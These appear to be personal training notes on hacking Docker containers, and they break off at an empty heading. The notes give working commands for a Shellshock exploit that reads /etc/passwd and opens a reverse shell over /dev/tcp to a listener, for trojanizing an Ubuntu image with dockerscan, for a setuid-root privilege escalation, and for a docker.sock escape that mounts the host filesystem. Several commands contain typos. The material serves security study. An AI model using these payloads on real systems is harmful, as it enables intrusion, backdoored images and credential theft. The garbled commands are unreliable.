# Hacking and Securing Docker Containers v2.0


Some of the notes that is specially outside from the [general notes](../Notes.md). 

Things that we will be looking at are:
- Introduction to Docker
- Docker fundamentals
- Attacks against docker environments
- Automated Assessments
- Defenses

---

## Hacking Docker Containers
### Docker Attack Surface
- External attackers using API
- Malicious insiders
- Compromised container (modified image)

### Exploting vulnerable images
This image has the vulnerability of a shellshock, affected many services (http, smtp, ssh)
[Image link](https://hub.docker.com/r/vulnerables/cve-2014-6271)
```bash
docker run --rm -it -p 8080:80 vulnerables/cve-2014-6271
```

Curl the command line to get the list of the password
```bash
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'" http://localhost:8080/cgi-bin/vulnerable
```

Curl the command line below to do a interative accessing the container
```bash
# Terminal 1
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 @>&l'" http://localhost:8080/cgi-bin/vulnerable

# Terminal 2: You can access data in the docker container
nc -nlvp 4444

```
Why 172.17.0.1? Use `ipconfig docker0` to get the ip address from the inet

### Backdooring docker images
```bash
git clone https://github.com/cr0hn/dockerscan.git
sudo python3.8 setup.py install

# Verify dockerscan is installed
dockerscan

# Change directory to backdoor and remove everything
cd ..
cd backdoor
rm -rf *

# Pull the latest ubuntu image and save it as a new tar image
docker pull ubuntu:latest && docker save ubuntu:latest -o ubuntu-original

# Setting some environment variable
export LC_ALL=C.UTF-8
export LANG=C.UTF-8

# Finding the ip address to be used for backdooring
ipconfig docker0
### inet 172.17.0.1 <---- this ip address is the one we will be using

# Modifying the image
dockerscan image modify trojanize ubuntu-original -l 172.17.0.1 -p 4444 -o ubuntu-original-trojanized

# Terminal 1: To receive the reversed shell, and use the interative
nc -v -k -l 172.17.0.1 4444

# When someone pull your image
docker load -i ubuntu-original-trojanized.tar
docker run -it ubuntu:latest bash

# You can access it from Terminal 1
```

### Privilege Escalation
Getting the root access to the host machine as a non-root user

Four files are required
- Dockerfile
```yaml
FROM alpine:latest
COPY shellscript.sh shellscript.sh
COPY shell shell
```
- shell.c
```c
int main() {
    setuid(0);
    system("/bin/sh");
    return 0;
}
```
- shellscript.sh
```
#!/bin/bash
cp shell /shared/shell
chmod 4777 /shared/shell
```

Then we build the image
```sh
docker build --rm -t privesc .
```
- `shell` binary file under /usr/bin/shell

Then we can run the docker command
`docker run -v /tmp/:/shared/ privesc:latest /bin/sh shellscript.sh`
-v : setting the volume to link the /tmp on the local host to the shared folder in the container
privesc: Name of the image
/bin/sh shellscript.sh: Entrypoint for the docker run

Navigate to the tmp directory and run the shell, voila you get to acess all the files on the root access
```sh
cd /tmp
./shell
# id
# cat /etc/shadow
```

### Container Breakout techniques
Existing exploits
1. Over privileged containers - CAP_SYS_ADMIN, CAP_SYS_MODULE
2. Dangerous mountpoints - /var/run/docker.sock

### Docker socket (docker.sock)
- Docker socket is a UNIX socket, which is a backbone for managing containers.
- When we type Docker commands using docker cli client, it interacts with Docker daemon using the UNIX socket.
- This socket can be exposed over the network on a specific port - HTTP API.
- UNIX socket is the default setting.
- Mounting /var/run/docker.sock into the container is dangerous.

### Container escape using docker.sock
Getting a shell to start attac
`dockr run --rm -it -v /var/run/docker.sock:/var/run/docker.sock alpine sh`

Install docker client
```
apk udpdate
apk add -U docker

```sh
Running another container in within the container and mount the root
```sh
docker -H unix:///var/run/docker.sock run -it -v /:/test:ro -t alpine sh
```
-H unix:///var/run/docker.sock: Specifying that this is the docker socket that docker can use
ro: readonly

Now we are inside the new container and we can access the root folder of the host
```sh
cd /test/root
```

### --privileged flag
- When --privileged flag is used with a container, it will give all Linux capabilities to the container.
- If an attacker gains access to the container he can take advantage of these capabilities.
- **cap_sys_admin**, **cap_sys_ptrace** and **cap_sys_module** are some of the dangerous capabilities to be exploited by attacked.
- When an attacker gains a shell on the container and if it has cap_sys_module enabled, it is possible to load a kernel module directly onto the host’s kernel from within the container.

```sh
# Using the privilege flag
docker run -it --privilege alpine sh

# Install
apk add -U libcap

# Get the list of the privilege capabilities
capsh --print

```

### Writing to kernel space from a container